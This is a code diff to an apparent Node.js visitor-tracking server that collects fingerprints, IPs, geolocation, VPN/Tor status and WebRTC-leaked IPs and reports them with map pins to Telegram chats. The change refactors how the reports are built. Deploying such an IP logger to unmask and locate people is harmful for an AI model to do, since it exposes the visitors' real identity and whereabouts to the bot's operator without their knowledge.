@@ -6,6 +6,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const fingerprint = require('./modules/fingerprint');
 const visitorInfo = require('./modules/visitorinfo');
 const parseDevice = require('./modules/parsdevice');
+const reportInfo = require('./modules/reportinfo');
 
 const app = express();
 app.use(express.json());
@@ -74,24 +75,16 @@ app.post('/collect', async (req, res) => {
   const visitId = fp || `ip_${ip}`;
 
   // --- Краткий отчет для основного сообщения ---
-  let shortMsg = '';
-  if (status.status === 'new') {
-    shortMsg += '🆕 НОВЫЙ ЗАХОД\n';
-  } else if (status.status === 'repeat') {
-    shortMsg += '♻️ ПОВТОРНЫЙ ЗАХОД\n';
-    shortMsg += `Шанс совпадения: ${status.score}% (${status.reason})\n`;
-    shortMsg += `Последний визит: ${formatDate(status.lastSeen, timezone)}\n`;
-  } else {
-    shortMsg += '❓ НЕИЗВЕСТНЫЙ ЗАХОД\n';
-    if (!fp) shortMsg += 'Причина: отсутствует fingerprint\n';
-    if (!userAgent) shortMsg += 'Причина: отсутствует User-Agent\n';
-    if (status.lastSeen) shortMsg += `Возможный визит: ${formatDate(status.lastSeen, timezone)}\n`;
-  }
-  shortMsg += `Тип: ${type}\n`;
-  shortMsg += `IP: ${ip} — ${geoStr}\n`;
-  shortMsg += `Устройство: ${uaData.device || 'неизвестно'}\n`;
-  shortMsg += `Браузер: ${uaData.browser || 'неизвестно'}, ОС: ${uaData.os || 'неизвестно'}\n`;
-  shortMsg += `Время: ${new Date().toLocaleTimeString('ru-RU', { timeZone: timezone || 'UTC' })}`;
+  let shortMsg = reportInfo.buildShortReport({
+    status,
+    fp,
+    userAgent,
+    timezone,
+    type,
+    ip,
+    geoStr,
+    uaData
+  });
 
   // --- Подробный отчет для второй кнопки ---
   // Собираем WebRTC IPs (если есть)
@@ -108,42 +101,29 @@ app.post('/collect', async (req, res) => {
     }
   } catch {}
 
-  let detailsMsg = '';
-  detailsMsg += `Провайдер: ${geoData.org || 'неизвестно'}\n`;
-  detailsMsg += `VPN/Proxy/Tor: ${(geoData.proxy || geoData.hosting) ? 'Да' : 'Нет'}\n`;
-  detailsMsg += `User-Agent: ${userAgent || 'неизвестно'}\n`;
-  detailsMsg += `Fingerprint: ${fp || 'неизвестно'}\n`;
-  detailsMsg += `WebRTC IPs: ${webrtcIps.length ? webrtcIps.join(', ') : 'нет данных'}\n`;
-  detailsMsg += `Размер экрана: ${req.body.screenSize || 'неизвестно'}\n`;
-  if (req.body.width || req.body.height || req.body.platform) {
-    detailsMsg += `Доп. device info: `;
-    if (req.body.width) detailsMsg += `width: ${req.body.width} `;
-    if (req.body.height) detailsMsg += `height: ${req.body.height} `;
-    if (req.body.platform) detailsMsg += `platform: ${req.body.platform}`;
-    detailsMsg += '\n';
-  }
+  // Формируем detailsMsg через reportinfo
+  let detailsMsg = reportInfo.buildDetailsReport({
+    geoData,
+    userAgent,
+    fp,
+    webrtcIps,
+    ip,
+    screenSize: req.body.screenSize,
+    width: req.body.width,
+    height: req.body.height,
+    platform: req.body.platform
+  });
 
-  // --- Кнопки ---
-  let inlineKeyboard = [];
-  // Кнопка "Посмотреть подробнее"
-  inlineKeyboard.push([
-    { text: 'Посмотреть подробнее', callback_data: `details_${visitId}` }
-  ]);
+  // --- Кнопки и карта ---
+  const inlineKeyboard = reportInfo.buildInlineKeyboard(visitId);
 
   // Отправка в Telegram: карта с отчетом в подписи, затем кнопка
   for (const chatId of CHAT_IDS) {
     try {
       if (geoData.lat && geoData.lon && ip && ip !== 'неизвестно') {
-        await bot.sendLocation(chatId, geoData.lat, geoData.lon, {
-          caption: shortMsg
-        });
-        await bot.sendMessage(chatId, '👇', {
-          reply_markup: { inline_keyboard: inlineKeyboard }
-        });
+        await reportInfo.sendLocationWithReport(bot, chatId, geoData, shortMsg, inlineKeyboard);
       } else {
-        await bot.sendMessage(chatId, shortMsg, {
-          reply_markup: { inline_keyboard: inlineKeyboard }
-        });
+        await reportInfo.sendShortReport(bot, chatId, shortMsg, inlineKeyboard);
       }
     } catch (err) {
       console.error('Ошибка Telegram:', err);
@@ -190,6 +170,9 @@ bot.on('callback_query', async (query) => {
     if (visit && visit.detailsMsg) {
       await bot.sendMessage(chatId, visit.detailsMsg, { reply_to_message_id: query.message.message_id });
     } else {
+      // Debug output for diagnosis
+      console.error('Детальная информация не найдена для visitId:', visitId);
+      console.error('Доступные visitId:', Object.keys(freshVisitors));
       await bot.sendMessage(chatId, 'Детальная информация не найдена.', { reply_to_message_id: query.message.message_id });
     }
   }
